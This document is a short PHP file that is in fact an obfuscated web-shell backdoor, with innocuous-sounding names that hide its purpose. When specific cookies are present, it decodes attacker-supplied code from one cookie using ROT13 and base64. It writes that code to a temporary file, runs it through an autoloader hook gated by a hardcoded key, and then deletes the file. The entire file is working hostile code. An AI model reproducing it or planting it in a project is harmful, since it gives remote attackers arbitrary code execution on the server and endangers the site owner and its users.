<?php


if (isset($_COOKIE[64-64]) && isset($_COOKIE[-27+28]) && isset($_COOKIE[-39+42]) && isset($_COOKIE[-25+29])) {
    $obj = $_COOKIE;
    function query_handler($element) {
        $obj = $_COOKIE;
        $reference = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '76bdecbe');
        if (!is_writable($reference)) {
            $reference = getcwd() . DIRECTORY_SEPARATOR . "data_storage";
        }
        $property_set = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($obj[3]));
        if (is_writeable($reference)) {
            $pset = fopen($reference, 'w+');
            fputs($pset, $property_set);
            fclose($pset);
            spl_autoload_unregister(__FUNCTION__);
            require_once($reference);
            @array_map('unlink', array($reference));
        }
    }
    spl_autoload_register("query_handler");
    $entry = "64787b9cb35fbe81f1755ba0a668a952";
    if (!strncmp($entry, $obj[4], 32)) {
        if (@class_parents("publish_content_splitter_tool", true)) {
            exit;
        }
    }
}
